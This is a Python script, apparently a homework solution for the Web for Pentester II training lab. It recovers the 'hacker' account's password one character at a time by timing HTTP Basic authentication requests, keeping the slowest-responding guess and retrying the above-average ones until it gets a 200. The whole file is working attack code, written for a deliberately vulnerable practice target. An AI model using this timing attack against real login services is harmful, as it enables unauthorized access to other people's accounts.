'''
This program is the solution for WFP2 Authentication Example #2

Usage: alex_rose_hw2.py <hostname or IP of WFP2 site to attack>
This program guesses the password for the "hacker" account via
checking the time that each request takes.  If the character takes
more time to guess than the rest, it is the correct next character
of the password.
Alex Rose 2-23-19
'''
import requests, sys, urllib, base64

def check_authentication_time(url, username, password, char):
    ''' 
    Times the response for a GET request to WFP2's authentication
    example 2 using basic HTTP authentication

    Args:
        url (string): url of WFP2 site to attack
        username: username to guess password of
        password (string): the password so far
        char: the next character of the password to test

    Returns:
        The amount of time in seconds that the GET request took
        If the password is guessed correctly and we get a 200 status code,
        return -1 to indicate success
    '''
    authExample2Url = url + "/authentication/example2"
    authData = username + ":" + password + char
    authData = str(base64.b64encode(authData.encode())).split("'")[1]
    authData = "Basic " + authData
    headers = {"Authorization":authData}

    response = requests.get(authExample2Url, headers=headers)

    if response.status_code == 200:
        return -1
    else:
        return response.elapsed.total_seconds()


if len(sys.argv) != 2:
    print("Usage: alex_rose_hw2.py <url>")
    sys.exit(1)

searchlist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
WFP2Url = sys.argv[1]

if "http://" not in WFP2Url:
    WFP2Url = "http://" + WFP2Url 

'''
test url for errors
'''
try:
    testRequest = requests.get(WFP2Url)
    if testRequest.status_code != 200 or "Web for Pentester II" not in testRequest.text:
        print("invalid WFP2 url provided!")
        sys.exit(1)
except requests.ConnectionError as e:
    print("invalid WFP2 url provided!")
    sys.exit(1)

password = ""
found = False

while not found:
    requestTimes = []
    
    for char in searchlist:
        time = check_authentication_time(WFP2Url, "hacker", password, char)
        if time == -1:
            found = True
            password += char
            print(password + " is the password!")
            break
        else:
            print("hacker:" + password + char + "- " + str(time))
            requestTimes.append(time)

        #Find avg of request times, try above avg times again
    if not found:
        averageTime = sum(requestTimes) / len(requestTimes)

        retryList = ""
        index = 0
        for time in requestTimes:
            if time > averageTime:
                retryList += searchlist[index]

            index += 1

        #Retry the above average time characters, choose the highest
        #result from the second pass
        requestTimes = []
        for char in retryList:
            time = check_authentication_time(WFP2Url, "hacker", password, char)
            requestTimes.append(time)
            print("hacker:" + password + char + "- " + str(time))

        password += retryList[requestTimes.index(max(requestTimes))]
